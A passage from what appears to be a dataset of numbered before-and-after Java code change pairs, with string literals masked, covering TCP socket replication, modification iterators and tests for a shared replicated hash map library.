          final Iterator it=selector.selectedKeys().iterator();
          while (it.hasNext()) {
            SelectionKey key=(SelectionKey)it.next();
            it.remove();
            try {
              if (key.isConnectable()) {
                LOG.info(""String_Node_Str"");
              }
              if (!key.isValid()) {
                continue;
              }
              if (key.isReadable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryReader.readAll(socketChannel0);
              }
              if (key.isWritable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
              }
            }
 catch (            Exception e) {
              if (socketChannel.isOpen())               LOG.log(Level.SEVERE,""String_Node_Str"",e);
              try {
                key.channel().close();
              }
 catch (              IOException ex) {
              }
            }
          }
        }
      }
 catch (      Exception e) {
        final SocketChannel socketChannel=socketChannelRef.get();
        if (socketChannel != null && socketChannel.isOpen()) {
          LOG.log(Level.SEVERE,""String_Node_Str"",e);
        }
      }
    }
  }
);
}"
91373,"@Override public void run(){
  try {
    SocketChannel socketChannel=null;
    for (; ; ) {
      try {
        socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
        LOG.info(""String_Node_Str"" + clientPort);
        socketChannel.socket().setReceiveBufferSize(8 * 1024);
        break;
      }
 catch (      ConnectException e) {
        if (socketChannel != null)         socketChannel.close();
        Thread.sleep(100);
      }
    }
    LOG.info(""String_Node_Str"" + map.getIdentifier());
    socketChannelRef.set(socketChannel);
    socketChannelEntryWriter.sendBootstrap(socketChannel,map.lastModification(),map.getIdentifier());
    final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readBootstrap(socketChannel);
    final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
    remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
    if (bootstrap.identifier == map.getIdentifier())     throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
    LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
    socketChannel.configureBlocking(false);
    final Selector selector=Selector.open();
    socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    while (socketChannel.isOpen()) {
      final int n=selector.select();
      if (n == 0) {
        continue;
      }
      final Iterator it=selector.selectedKeys().iterator();
      while (it.hasNext()) {
        SelectionKey key=(SelectionKey)it.next();
        it.remove();
        try {
          if (!key.isValid()) {
            continue;
          }
          if (key.isReadable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryReader.readAll(socketChannel0);
          }
          if (key.isWritable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
          }
        }
 catch (        Exception e) {
          if (socketChannel.isOpen())           LOG.log(Level.SEVERE,""String_Node_Str"",e);
          try {
            key.channel().close();
          }
 catch (          IOException ex) {
          }
        }
      }
    }
  }
 catch (  Exception e) {
    final SocketChannel socketChannel=socketChannelRef.get();
    if (socketChannel != null && socketChannel.isOpen()) {
      LOG.log(Level.SEVERE,""String_Node_Str"",e);
    }
  }
}","@Override public void run(){
  try {
    SocketChannel socketChannel=null;
    for (; ; ) {
      try {
        socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
        LOG.info(""String_Node_Str"" + clientPort);
        socketChannel.socket().setReceiveBufferSize(8 * 1024);
        break;
      }
 catch (      ConnectException e) {
        if (socketChannel != null)         socketChannel.close();
        Thread.sleep(100);
      }
    }
    LOG.info(""String_Node_Str"" + map.getIdentifier());
    socketChannelRef.set(socketChannel);
    socketChannelEntryWriter.sendBootstrap(socketChannel,map.lastModification(),map.getIdentifier());
    final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readBootstrap(socketChannel);
    final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
    remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
    if (bootstrap.identifier == map.getIdentifier())     throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
    LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
    socketChannel.configureBlocking(false);
    final Selector selector=Selector.open();
    socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    while (socketChannel.isOpen()) {
      final int n=selector.select();
      if (n == 0) {
        continue;
      }
      final Iterator it=selector.selectedKeys().iterator();
      while (it.hasNext()) {
        SelectionKey key=(SelectionKey)it.next();
        it.remove();
        try {
          if (key.isConnectable()) {
            LOG.info(""String_Node_Str"");
          }
          if (!key.isValid()) {
            continue;
          }
          if (key.isReadable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryReader.readAll(socketChannel0);
          }
          if (key.isWritable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
          }
        }
 catch (        Exception e) {
          if (socketChannel.isOpen())           LOG.log(Level.SEVERE,""String_Node_Str"",e);
          try {
            key.channel().close();
          }
 catch (          IOException ex) {
          }
        }
      }
    }
  }
 catch (  Exception e) {
    final SocketChannel socketChannel=socketChannelRef.get();
    if (socketChannel != null && socketChannel.isOpen()) {
      LOG.log(Level.SEVERE,""String_Node_Str"",e);
    }
  }
}"
91374,"/** 
 * @return the maximum size that an entry can be, this includes over sized entries
 */
int maxEntrySize(){
  return entrySize * 2;
}","/** 
 * @return the maximum size that an entry can be, this includes over sized entries
 */
int maxEntrySize(){
  return entrySize * bufferAllocationFactor;
}"
91375,"/** 
 * set the bit related to   {@code segment} and {@code pos}
 * @param segment the segment relating to the bit to set
 * @param pos     the position relating to the bit to set
 */
void set(SharedSegment segment,int pos);","/** 
 * set the bit related to   {@code segment} and {@code pos}
 * @param segmentIndex the segment relating to the bit to set
 * @param pos     the position relating to the bit to set
 */
void set(int segmentIndex,int pos);"
91376,"/** 
 * {@inheritDoc}
 */
public void dirtyNewerEntries(final long timeStamp,final EntryModifiableCallback entryModifiableCallback){
  this.lock();
  try {
    hashLookupLiveAndDeleted.forEach(new IntIntMultiMap.EntryConsumer(){
      @Override public void accept(      int hash,      int pos){
        final long offset=offsetFromPos(pos);
        final NativeBytes entry=entry(offset);
        if (isNewer(entry,timeStamp))         entryModifiableCallback.set(Segment.this,pos);
      }
    }
);
  }
  finally {
    unlock();
  }
}","/** 
 * {@inheritDoc}
 */
public void dirtyNewerEntries(final long timeStamp,final EntryModifiableCallback entryModifiableCallback){
  this.lock();
  try {
    final int index=Segment.this.getIndex();
    hashLookupLiveAndDeleted.forEach(new IntIntMultiMap.EntryConsumer(){
      @Override public void accept(      int hash,      int pos){
        final long offset=offsetFromPos(pos);
        final NativeBytes entry=entry(offset);
        if (isNewer(entry,timeStamp))         entryModifiableCallback.set(index,pos);
      }
    }
);
  }
  finally {
    unlock();
  }
}"
91377,"/** 
 * {@inheritDoc}
 */
@Override public ModificationIterator acquireModificationIterator(byte remoteIdentifier) throws IOException {
  if (!canReplicate)   throw new UnsupportedOperationException();
  final ModificationIterator modificationIterator=modificationIterators.get(remoteIdentifier);
  if (modificationIterator != null)   return modificationIterator;
  final File modificationIteratorFile=new File(file().getAbsolutePath() + '-' + remoteIdentifier+ ""String_Node_Str"");
synchronized (modificationIterators) {
    final MappedStore mappedStore=new MappedStore(modificationIteratorFile,FileChannel.MapMode.READ_WRITE,modIterBitSetSizeInBytes());
    final ModificationIterator newEventListener=new ModificationIterator(modificationIteratorNotifier,modificationIteratorWatchList,mappedStore.bytes(),eventListener);
    final boolean success=modificationIterators.compareAndSet(remoteIdentifier,null,newEventListener);
    return (success) ? (ModificationIterator)(eventListener=newEventListener) : acquireModificationIterator(remoteIdentifier);
  }
}","/** 
 * {@inheritDoc}
 */
@Override public ModificationIterator acquireModificationIterator(byte remoteIdentifier) throws IOException {
  if (!canReplicate)   throw new UnsupportedOperationException();
  final ModificationIterator modificationIterator=modificationIterators.get(remoteIdentifier);
  if (modificationIterator != null)   return modificationIterator;
synchronized (modificationIterators) {
    final ModificationIterator modificationIterator0=modificationIterators.get(remoteIdentifier);
    if (modificationIterator0 != null)     return modificationIterator0;
    final File modificationIteratorFile=new File(file().getAbsolutePath() + '-' + remoteIdentifier+ ""String_Node_Str"");
    final MappedStore mappedStore=new MappedStore(modificationIteratorFile,FileChannel.MapMode.READ_WRITE,modIterBitSetSizeInBytes());
    final ModificationIterator newEventListener=new ModificationIterator(modificationIteratorNotifier,modificationIteratorWatchList,mappedStore.bytes(),eventListener);
    modificationIterators.set(remoteIdentifier,newEventListener);
    eventListener=newEventListener;
    return newEventListener;
  }
}"
91378,"@Override public int maxEntrySize(){
  return super.maxEntrySize();
}","@Override public int maxEntrySize(){
  return super.maxEntrySize() + 128;
}"
91379,"@Override public void accept(int hash,int pos){
  final long offset=offsetFromPos(pos);
  final NativeBytes entry=entry(offset);
  if (isNewer(entry,timeStamp))   entryModifiableCallback.set(Segment.this,pos);
}","@Override public void accept(int hash,int pos){
  final long offset=offsetFromPos(pos);
  final NativeBytes entry=entry(offset);
  if (isNewer(entry,timeStamp))   entryModifiableCallback.set(index,pos);
}"
91380,"public void set(SharedSegment segment,int pos){
  System.out.println(""String_Node_Str"" + segment.getIndex() + ""String_Node_Str""+ pos);
  changes.set(combine(segment.getIndex(),pos));
}","@Override public synchronized void set(int segmentIndex,int pos){
  changes.set(combine(segmentIndex,pos));
}"
91381,"/** 
 * binds to the server socket and process data This method will block until interrupted
 * @throws Exception
 */
private void process() throws Exception {
  LOG.info(""String_Node_Str"" + port);
  ServerSocket serverSocket=serverChannel.socket();
  Selector selector=Selector.open();
  serverSocket.setReuseAddress(true);
  serverSocket.bind(new InetSocketAddress(port));
  serverChannel.configureBlocking(false);
  serverChannel.register(selector,SelectionKey.OP_ACCEPT);
  while (!isClosed.get()) {
    final int n=selector.select();
    if (n == 0) {
      continue;
    }
    final Iterator it=selector.selectedKeys().iterator();
    while (it.hasNext()) {
      SelectionKey key=(SelectionKey)it.next();
      if (key.isAcceptable()) {
        final ServerSocketChannel server=(ServerSocketChannel)key.channel();
        final SocketChannel channel=server.accept();
        channel.configureBlocking(false);
        final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(entrySize,this.externalizable);
        final WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(channel);
        final ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
        remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
        final Attached attached=new Attached(socketChannelEntryReader,remoteModificationIterator);
        channel.register(selector,SelectionKey.OP_WRITE | SelectionKey.OP_READ,attached);
        socketChannelEntryWriter.sendWelcomeMessage(channel,map.lastModification(),localIdentifier);
      }
      try {
        if (key.isWritable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          socketChannelEntryWriter.writeAll(socketChannel,attachment.remoteModificationIterator);
        }
        if (key.isReadable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          attachment.socketChannelEntryReader.readAll(socketChannel);
        }
      }
 catch (      Exception e) {
        LOG.log(Level.INFO,""String_Node_Str"",e);
        try {
          key.channel().close();
        }
 catch (        IOException ex) {
        }
      }
      it.remove();
    }
  }
}","/** 
 * binds to the server socket and process data This method will block until interrupted
 * @throws Exception
 */
private void process() throws Exception {
  LOG.info(""String_Node_Str"" + port);
  ServerSocket serverSocket=serverChannel.socket();
  Selector selector=Selector.open();
  serverSocket.setReuseAddress(true);
  serverSocket.bind(new InetSocketAddress(port));
  serverChannel.configureBlocking(false);
  serverChannel.register(selector,SelectionKey.OP_ACCEPT);
  while (!isClosed.get()) {
    final int n=selector.select();
    if (n == 0) {
      continue;
    }
    final Iterator it=selector.selectedKeys().iterator();
    while (it.hasNext()) {
      SelectionKey key=(SelectionKey)it.next();
      if (key.isAcceptable()) {
        final ServerSocketChannel server=(ServerSocketChannel)key.channel();
        final SocketChannel channel=server.accept();
        channel.configureBlocking(false);
        final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(entrySize,this.externalizable);
        final WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(channel);
        final ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
        remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
        final Attached attached=new Attached(socketChannelEntryReader,remoteModificationIterator);
        channel.register(selector,SelectionKey.OP_WRITE | SelectionKey.OP_READ,attached);
        socketChannelEntryWriter.sendWelcomeMessage(channel,map.lastModification(),localIdentifier);
      }
      try {
        if (key.isWritable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          socketChannelEntryWriter.writeAll(socketChannel,attachment.remoteModificationIterator);
        }
        if (key.isReadable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          attachment.socketChannelEntryReader.readAll(socketChannel);
        }
      }
 catch (      Exception e) {
        if (!isClosed.get()) {
          try {
            key.channel().close();
          }
 catch (          IOException ex) {
          }
        }
      }
      it.remove();
    }
  }
}"
91382,"@Test public void test() throws IOException, InterruptedException {
  Thread.sleep(1000);
  map1.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map3.remove(2);
  map4.put(4,""String_Node_Str"");
  waitTillEqual(1000000);
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map2));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map3));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map4));
  assertTrue(""String_Node_Str"",!map2.isEmpty());
}","@Test public void test() throws IOException, InterruptedException {
  Thread.sleep(500);
  map1.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map4.put(4,""String_Node_Str"");
  waitTillEqual(1000);
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map2));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map3));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map4));
  assertTrue(""String_Node_Str"",!map2.isEmpty());
}"
91383,"VanillaSharedReplicatedHashMap<Integer,CharSequence> newSocketShmIntString(final byte identifier,final int serverPort,ClientPort... clientSocketChannelProviderMaps) throws IOException {
  final VanillaSharedReplicatedHashMapBuilder builder=new VanillaSharedReplicatedHashMapBuilder().entries(1000).identifier(identifier);
  final VanillaSharedReplicatedHashMap<Integer,CharSequence> result=builder.create(getPersistenceFile(),Integer.class,CharSequence.class);
  final int adjustedEntrySize=builder.entrySize() + 128;
  final short maxNumberOfEntriesPerChunk=ServerTcpSocketReplicator.toMaxNumberOfEntriesPerChunk(1024 * 8,adjustedEntrySize);
  for (  ClientPort clientSocketChannelProvider : clientSocketChannelProviderMaps) {
    final SocketChannelEntryWriter socketChannelEntryWriter0=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
    final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(builder.entrySize(),result);
    ClientTcpSocketReplicator clientTcpSocketReplicator=new ClientTcpSocketReplicator(clientSocketChannelProvider,socketChannelEntryReader,socketChannelEntryWriter0,result);
    result.addCloseable(clientTcpSocketReplicator);
  }
  final SocketChannelEntryWriter socketChannelEntryWriter=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
  ServerTcpSocketReplicator serverTcpSocketReplicator=new ServerTcpSocketReplicator(result,result,serverPort,socketChannelEntryWriter);
  result.addCloseable(serverTcpSocketReplicator);
  return result;
}","static VanillaSharedReplicatedHashMap<Integer,CharSequence> newSocketShmIntString(final byte identifier,final int serverPort,ClientPort... clientSocketChannelProviderMaps) throws IOException {
  final VanillaSharedReplicatedHashMapBuilder builder=new VanillaSharedReplicatedHashMapBuilder().entries(1000).identifier(identifier);
  final VanillaSharedReplicatedHashMap<Integer,CharSequence> result=builder.create(getPersistenceFile(),Integer.class,CharSequence.class);
  final int adjustedEntrySize=builder.entrySize() + 128;
  final short maxNumberOfEntriesPerChunk=ServerTcpSocketReplicator.toMaxNumberOfEntriesPerChunk(1024 * 8,adjustedEntrySize);
  for (  ClientPort clientSocketChannelProvider : clientSocketChannelProviderMaps) {
    final SocketChannelEntryWriter socketChannelEntryWriter0=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
    final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(builder.entrySize(),result);
    ClientTcpSocketReplicator clientTcpSocketReplicator=new ClientTcpSocketReplicator(clientSocketChannelProvider,socketChannelEntryReader,socketChannelEntryWriter0,result);
    result.addCloseable(clientTcpSocketReplicator);
  }
  final SocketChannelEntryWriter socketChannelEntryWriter=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
  ServerTcpSocketReplicator serverTcpSocketReplicator=new ServerTcpSocketReplicator(result,result,serverPort,socketChannelEntryWriter);
  result.addCloseable(serverTcpSocketReplicator);
  return result;
}"
91384,"/** 
 * @return the maximum size that an entry can be, this includes over sized entries
 */
int maxEntrySize(){
  return entrySize * 2;
}","/** 
 * @return the maximum size that an entry can be, this includes over sized entries
 */
int maxEntrySize(){
  return entrySize;
}"
91385,"/** 
 * {@inheritDoc}
 */
public void dirtyNewerEntries(final long timeStamp,final EntryModifiableCallback entryModifiableCallback){
  this.lock();
  try {
    final int index=Segment.this.getIndex();
    hashLookupLiveAndDeleted.forEach(new IntIntMultiMap.EntryConsumer(){
      @Override public void accept(      int hash,      int pos){
        final long offset=offsetFromPos(pos);
        final NativeBytes entry=entry(offset);
        if (isNewer(entry,timeStamp))         entryModifiableCallback.set(index,pos);
      }
    }
);
  }
  finally {
    unlock();
  }
}","/** 
 * {@inheritDoc}
 */
public void dirtyNewerEntries(final long timeStamp,final EntryModifiableCallback entryModifiableCallback){
  this.lock();
  try {
    final int index=Segment.this.getIndex();
    hashLookupLiveAndDeleted.forEach(new IntIntMultiMap.EntryConsumer(){
      @Override public void accept(      int hash,      int pos){
        final long offset=offsetFromPos(pos);
        final NativeBytes entry=entry(offset);
        if (isNewer(entry,timeStamp)) {
          entryModifiableCallback.set(index,pos);
        }
      }
    }
);
  }
  finally {
    unlock();
  }
}"
91386,"@Override public void accept(int hash,int pos){
  final long offset=offsetFromPos(pos);
  final NativeBytes entry=entry(offset);
  if (isNewer(entry,timeStamp))   entryModifiableCallback.set(index,pos);
}","@Override public void accept(int hash,int pos){
  final long offset=offsetFromPos(pos);
  final NativeBytes entry=entry(offset);
  if (isNewer(entry,timeStamp)) {
    entryModifiableCallback.set(index,pos);
  }
}"
91387,"@Override public synchronized void set(int segmentIndex,int pos){
  changes.set(combine(segmentIndex,pos));
}","@Override public synchronized void set(int segmentIndex,int pos){
  final long combine=combine(segmentIndex,pos);
  System.out.println(""String_Node_Str"" + combine);
  changes.set(combine);
}"
91388,"public ClientTcpSocketReplicator(@NotNull final ClientPort clientPort,@NotNull final SocketChannelEntryReader socketChannelEntryReader,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter,@NotNull final ReplicatedSharedHashMap map){
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"",true)).execute(new Runnable(){
    @Override public void run(){
      try {
        SocketChannel socketChannel=null;
        for (; ; ) {
          try {
            socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
            LOG.info(""String_Node_Str"" + clientPort);
            socketChannel.socket().setReceiveBufferSize(8 * 1024);
            break;
          }
 catch (          ConnectException e) {
            if (socketChannel != null)             socketChannel.close();
            Thread.sleep(100);
          }
        }
        socketChannelRef.set(socketChannel);
        socketChannelEntryWriter.sendWelcomeMessage(socketChannel,map.lastModification(),map.getIdentifier());
        final SocketChannelEntryReader.WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(socketChannel);
        final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
        remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
        socketChannel.configureBlocking(false);
        final Selector selector=Selector.open();
        socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
        while (!isClosed.get()) {
          int n=selector.select();
          if (n == 0) {
            continue;
          }
          final Iterator it=selector.selectedKeys().iterator();
          while (it.hasNext()) {
            SelectionKey key=(SelectionKey)it.next();
            if (key.isReadable()) {
              socketChannelEntryReader.readAll(socketChannel);
            }
 else             if (key.isWritable()) {
              socketChannelEntryWriter.writeAll(socketChannel,remoteModificationIterator);
            }
            it.remove();
          }
        }
      }
 catch (      Exception e) {
        if (!isClosed.get()) {
          LOG.log(Level.SEVERE,""String_Node_Str"",e);
        }
      }
    }
  }
);
}","public ClientTcpSocketReplicator(@NotNull final ClientPort clientPort,@NotNull final SocketChannelEntryReader socketChannelEntryReader,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter,@NotNull final ReplicatedSharedHashMap map){
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"",true)).execute(new Runnable(){
    @Override public void run(){
      try {
        SocketChannel socketChannel=null;
        for (; ; ) {
          try {
            socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
            LOG.info(""String_Node_Str"" + clientPort);
            socketChannel.socket().setReceiveBufferSize(8 * 1024);
            break;
          }
 catch (          ConnectException e) {
            if (socketChannel != null)             socketChannel.close();
            Thread.sleep(100);
          }
        }
        socketChannelRef.set(socketChannel);
        socketChannelEntryWriter.sendWelcomeMessage(socketChannel,map.lastModification(),map.getIdentifier());
        final SocketChannelEntryReader.WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(socketChannel);
        final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
        remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
        socketChannel.configureBlocking(false);
        final Selector selector=Selector.open();
        socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
        while (!isClosed.get()) {
          int n=selector.select();
          if (n == 0) {
            continue;
          }
          final Iterator it=selector.selectedKeys().iterator();
          while (it.hasNext()) {
            SelectionKey key=(SelectionKey)it.next();
            if (key.isReadable()) {
              final SocketChannel socketChannel0=(SocketChannel)key.channel();
              socketChannelEntryReader.readAll(socketChannel0);
            }
 else             if (key.isWritable()) {
              final SocketChannel socketChannel0=(SocketChannel)key.channel();
              socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
            }
            it.remove();
          }
        }
      }
 catch (      Exception e) {
        if (!isClosed.get()) {
          LOG.log(Level.SEVERE,""String_Node_Str"",e);
        }
      }
    }
  }
);
}"
91389,"@Override public void run(){
  try {
    SocketChannel socketChannel=null;
    for (; ; ) {
      try {
        socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
        LOG.info(""String_Node_Str"" + clientPort);
        socketChannel.socket().setReceiveBufferSize(8 * 1024);
        break;
      }
 catch (      ConnectException e) {
        if (socketChannel != null)         socketChannel.close();
        Thread.sleep(100);
      }
    }
    socketChannelRef.set(socketChannel);
    socketChannelEntryWriter.sendWelcomeMessage(socketChannel,map.lastModification(),map.getIdentifier());
    final SocketChannelEntryReader.WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(socketChannel);
    final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
    remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
    socketChannel.configureBlocking(false);
    final Selector selector=Selector.open();
    socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    while (!isClosed.get()) {
      int n=selector.select();
      if (n == 0) {
        continue;
      }
      final Iterator it=selector.selectedKeys().iterator();
      while (it.hasNext()) {
        SelectionKey key=(SelectionKey)it.next();
        if (key.isReadable()) {
          socketChannelEntryReader.readAll(socketChannel);
        }
 else         if (key.isWritable()) {
          socketChannelEntryWriter.writeAll(socketChannel,remoteModificationIterator);
        }
        it.remove();
      }
    }
  }
 catch (  Exception e) {
    if (!isClosed.get()) {
      LOG.log(Level.SEVERE,""String_Node_Str"",e);
    }
  }
}","@Override public void run(){
  try {
    SocketChannel socketChannel=null;
    for (; ; ) {
      try {
        socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
        LOG.info(""String_Node_Str"" + clientPort);
        socketChannel.socket().setReceiveBufferSize(8 * 1024);
        break;
      }
 catch (      ConnectException e) {
        if (socketChannel != null)         socketChannel.close();
        Thread.sleep(100);
      }
    }
    socketChannelRef.set(socketChannel);
    socketChannelEntryWriter.sendWelcomeMessage(socketChannel,map.lastModification(),map.getIdentifier());
    final SocketChannelEntryReader.WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(socketChannel);
    final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
    remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
    socketChannel.configureBlocking(false);
    final Selector selector=Selector.open();
    socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    while (!isClosed.get()) {
      int n=selector.select();
      if (n == 0) {
        continue;
      }
      final Iterator it=selector.selectedKeys().iterator();
      while (it.hasNext()) {
        SelectionKey key=(SelectionKey)it.next();
        if (key.isReadable()) {
          final SocketChannel socketChannel0=(SocketChannel)key.channel();
          socketChannelEntryReader.readAll(socketChannel0);
        }
 else         if (key.isWritable()) {
          final SocketChannel socketChannel0=(SocketChannel)key.channel();
          socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
        }
        it.remove();
      }
    }
  }
 catch (  Exception e) {
    if (!isClosed.get()) {
      LOG.log(Level.SEVERE,""String_Node_Str"",e);
    }
  }
}"
91390,"/** 
 * binds to the server socket and process data This method will block until interrupted
 * @throws Exception
 */
private void process() throws Exception {
  LOG.info(""String_Node_Str"" + port);
  ServerSocket serverSocket=serverChannel.socket();
  Selector selector=Selector.open();
  serverSocket.setReuseAddress(true);
  serverSocket.bind(new InetSocketAddress(port));
  serverChannel.configureBlocking(false);
  serverChannel.register(selector,SelectionKey.OP_ACCEPT);
  while (!isClosed.get()) {
    final int n=selector.select();
    if (n == 0) {
      continue;
    }
    final Iterator it=selector.selectedKeys().iterator();
    while (it.hasNext()) {
      SelectionKey key=(SelectionKey)it.next();
      if (key.isAcceptable()) {
        final ServerSocketChannel server=(ServerSocketChannel)key.channel();
        final SocketChannel channel=server.accept();
        channel.configureBlocking(false);
        final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(entrySize,this.externalizable);
        final WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(channel);
        final ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
        remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
        final Attached attached=new Attached(socketChannelEntryReader,remoteModificationIterator);
        channel.register(selector,SelectionKey.OP_WRITE | SelectionKey.OP_READ,attached);
        socketChannelEntryWriter.sendWelcomeMessage(channel,map.lastModification(),localIdentifier);
      }
      try {
        if (key.isWritable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          socketChannelEntryWriter.writeAll(socketChannel,attachment.remoteModificationIterator);
        }
        if (key.isReadable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          attachment.socketChannelEntryReader.readAll(socketChannel);
        }
      }
 catch (      Exception e) {
        if (!isClosed.get()) {
          try {
            key.channel().close();
          }
 catch (          IOException ex) {
          }
        }
      }
      it.remove();
    }
  }
}","/** 
 * binds to the server socket and process data This method will block until interrupted
 * @throws Exception
 */
private void process() throws Exception {
  LOG.info(""String_Node_Str"" + port);
  ServerSocket serverSocket=serverChannel.socket();
  Selector selector=Selector.open();
  serverSocket.setReuseAddress(true);
  serverSocket.bind(new InetSocketAddress(port));
  serverChannel.configureBlocking(false);
  serverChannel.register(selector,SelectionKey.OP_ACCEPT);
  while (!isClosed.get()) {
    final int n=selector.select();
    if (n == 0) {
      continue;
    }
    final Iterator it=selector.selectedKeys().iterator();
    while (it.hasNext()) {
      SelectionKey key=(SelectionKey)it.next();
      if (key.isAcceptable()) {
        final ServerSocketChannel server=(ServerSocketChannel)key.channel();
        final SocketChannel channel=server.accept();
        channel.configureBlocking(false);
        final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(entrySize,this.externalizable);
        final WelcomeMessage welcomeMessage=socketChannelEntryReader.readWelcomeMessage(channel);
        final ModificationIterator remoteModificationIterator=map.acquireModificationIterator(welcomeMessage.identifier);
        remoteModificationIterator.dirtyEntries(welcomeMessage.timeStamp);
        final Attached attached=new Attached(socketChannelEntryReader,remoteModificationIterator);
        channel.register(selector,SelectionKey.OP_WRITE | SelectionKey.OP_READ,attached);
        socketChannelEntryWriter.sendWelcomeMessage(channel,map.lastModification(),localIdentifier);
      }
      try {
        if (key.isWritable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          socketChannelEntryWriter.writeAll(socketChannel,attachment.remoteModificationIterator);
        }
        if (key.isReadable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          attachment.socketChannelEntryReader.readAll(socketChannel);
        }
      }
 catch (      Exception e) {
